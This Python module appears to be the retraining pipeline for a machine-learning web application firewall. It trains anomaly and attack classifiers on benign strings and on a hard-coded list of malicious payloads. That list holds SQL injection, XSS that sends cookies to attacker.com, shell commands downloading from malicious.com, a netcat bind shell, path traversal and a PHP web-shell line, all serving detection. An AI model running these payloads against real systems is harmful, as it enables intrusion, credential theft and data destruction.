import os
import json
from ml_engine.config import BENIGN_SEEDS_PATH, ANOMALY_MODEL_PATH, CLASSIFIER_MODEL_PATH
from ml_engine.feature_extractor import extract_features
from ml_engine.anomaly_model import AnomalyDetector
from ml_engine.classifier_model import AttackClassifier

# ── Seed Datasets ───────────────────────────────────────────
DEFAULT_BENIGN_SEEDS = [
    "admin", "john.doe@company.com", "Hello world!", "How to install python?",
    "Select your profile settings", "The quick brown fox jumps over the lazy dog",
    "https://example.com/search?q=waf&category=security", "user_admin_123",
    "JSON payload structure is nice", "2026-08-07T12:00:00Z", "theme_dark=true",
    "Looking for cyber defense frameworks", "Best enterprise ZTNA portal",
    "app.py is streamlit based", "Standard input values are checked here",
    "127.0.0.1", "Chrome/120.0.0.0 Safari/537.36", "payroll", "ssh_tunnel_gate",
    "development_mode", "status_check_online", "Alice & Bob", "Secure access control",
    "No threat detected in transaction", "Order #44210", "Product count = 5",
    "Search results page 2", "user_avatar.png", "FAQ section", "pricing_table_monthly",
    "Please login with MFA code", "Reset password request", "Register new device",
    "Submit JIT access permission", "Approve requests", "Audit logs summary",
    "Vercel serverless proxy functions", "Postgres DB pool stats", "antivirus_status=true",
    "disk_encryption_state=enabled", "firewall_active=1", "Windows 11 workstation",
    "macOS 14 Sonoma", "Google Chrome Browser", "Firefox security extension",
    "Clean input string", "Nothing suspicious here", "Query completed successfully",
    "User profile updated.", "Setting language preference to EN_US", "port=443",
    "session_timeout=3600", "retry_attempts=3", "Welcome to ZTNA Control Panel",
    "billing_address_zip", "credit_card_mask", "support_ticket_subject", "chat_history",
    "dashboard_uptime_days", "packet_delivery_rate", "active_sessions_list",
    "compliance_framework_iso", "gdpr_settings", "soc2_audit_report", "mitre_attack_matrix"
]

DEFAULT_MALICIOUS_SEEDS = [
    # SQL Injection
    "' OR '1'='1", "1' OR 1=1 --", "admin' --", "admin' #", "' UNION SELECT NULL, NULL --",
    "UNION SELECT username, password FROM users --", "'; DROP TABLE users; --",
    "1 AND 1=1", "1 OR 2=2", "WAITFOR DELAY '0:0:5'", "SELECT BENCHMARK(1000000,MD5(1))",
    "xp_cmdshell 'dir'", "EXEC xp_cmdshell", "OR 1=1 LIMIT 1",
    
    # XSS
    "<script>alert(1)</script>", "<script src='http://attacker.com/steal.js'></script>",
    "<img src=x onerror=alert(document.cookie)>", "<svg/onload=alert('XSS')>",
    "javascript:alert('xss')", "<body onload=alert(1)>", "document.cookie",
    "document.location='http://attacker.com/steal.php?cookie='+document.cookie",
    
    # Command Injection
    "; rm -rf /", "; cat /etc/passwd", "| ls -la", "&& whoami", "$(whoami)",
    "`id`", "; wget http://malicious.com/shell.sh", "; curl -O http://malicious.com/backdoor",
    "&& nc -lvp 4444 -e /bin/sh", "; system('whoami')", "; exec('whoami')",
    
    # Directory Traversal
    "../../etc/passwd", "../../../../windows/system32/cmd.exe", "..\\..\\..\\..\\boot.ini",
    "%2e%2e%2f%2e%2e%2fetc%2fpasswd", "..%c0%af..%c0%afetc/passwd",
    
    # Remote Code Execution (RCE)
    "base64_decode($_POST['cmd'])", "eval(gzinflate(base64_decode('...')))",
    "php://input", "php://filter/read=convert.base64-encode/resource=index.php",
    "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+",
    
    # Suspicious HTTP
    "<?php system($_GET['cmd']); ?>", "/phpmyadmin/index.php", "/administrator/index.php",
    "/.env", "/robots.txt", "/wp-config.php", "/.git/config", "/\x00/etc/passwd"
]

def load_benign_seeds():
    """Loads benign seeds from config file or defaults."""
    if os.path.exists(BENIGN_SEEDS_PATH):
        try:
            with open(BENIGN_SEEDS_PATH, "r") as f:
                return json.load(f)
        except Exception:
            pass
    return DEFAULT_BENIGN_SEEDS

def save_benign_seeds(seeds):
    """Saves benign seeds list to JSON."""
    os.makedirs(os.path.dirname(BENIGN_SEEDS_PATH), exist_ok=True)
    with open(BENIGN_SEEDS_PATH, "w") as f:
        json.dump(seeds, f, indent=4)

def collect_training_samples(logs_file_path: str):
    """
    Collects training samples.
    Combines static seed sets with any dynamically logged attacks from attack_logs.json.
    """
    benign_payloads = load_benign_seeds()
    malicious_payloads = list(DEFAULT_MALICIOUS_SEEDS)

    # Load dynamic logged payloads
    if os.path.exists(logs_file_path):
        try:
            with open(logs_file_path, "r") as f:
                logs = json.load(f)
                
            dynamic_count = 0
            for log in logs:
                payload = log.get("payload") or log.get("user_input")
                # If it was logged, it was treated as an attack (malicious)
                if payload and payload not in malicious_payloads:
                    malicious_payloads.append(payload)
                    dynamic_count += 1
                    
            print(f"[ML-RETRAIN] Collected {dynamic_count} new dynamic samples from attack logs.")
        except Exception as e:
            print(f"[ML-RETRAIN] Error loading attack logs for training: {e}")

    # Deduplicate
    benign_payloads = list(set(benign_payloads))
    malicious_payloads = list(set(malicious_payloads))

    # Expand the benign dataset slightly with variations if small
    # (to provide a richer variety for Isolation Forest fitting)
    if len(benign_payloads) < 100:
        extra_benigns = []
        for bp in benign_payloads:
            extra_benigns.append(bp + "_safe")
            extra_benigns.append(bp.lower())
        benign_payloads.extend(extra_benigns)
        benign_payloads = list(set(benign_payloads))

    return benign_payloads, malicious_payloads

def retrain_pipeline(logs_file_path: str):
    """Executes the full feature extraction, anomaly training, and classifier training."""
    print("[ML-RETRAIN] Running ML retraining pipeline...")
    
    benign_payloads, malicious_payloads = collect_training_samples(logs_file_path)
    
    # Save benign seeds list for future reference
    save_benign_seeds(benign_payloads)

    # 1. Feature Extraction
    print(f"[ML-RETRAIN] Extracting features for {len(benign_payloads)} benign and {len(malicious_payloads)} malicious samples...")
    X_benign = [extract_features(p) for p in benign_payloads]
    X_malicious = [extract_features(p) for p in malicious_payloads]

    # 2. Train Unsupervised Anomaly Model (Isolation Forest trains ONLY on benign features)
    anomaly_detector = AnomalyDetector()
    anomaly_success = anomaly_detector.train(X_benign)

    # 3. Train Supervised Classifier (Random Forest trains on BOTH benign (0) and malicious (1))
    X_all = X_benign + X_malicious
    y_all = [0] * len(X_benign) + [1] * len(X_malicious)

    classifier = AttackClassifier()
    classifier_success = classifier.train(X_all, y_all)

    status = {
        "anomaly_trained": anomaly_success,
        "classifier_trained": classifier_success,
        "benign_samples": len(benign_payloads),
        "malicious_samples": len(malicious_payloads),
        "saved_paths": {
            "anomaly": ANOMALY_MODEL_PATH,
            "classifier": CLASSIFIER_MODEL_PATH
        }
    }
    print("[ML-RETRAIN] Retraining pipeline completed successfully.")
    return status

if __name__ == "__main__":
    # Test script directly
    parent_dir = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
    logs_path = os.path.join(parent_dir, "attack_logs.json")
    print(f"Running retraining with logs: {logs_path}")
    res = retrain_pipeline(logs_path)
    print(json.dumps(res, indent=2))
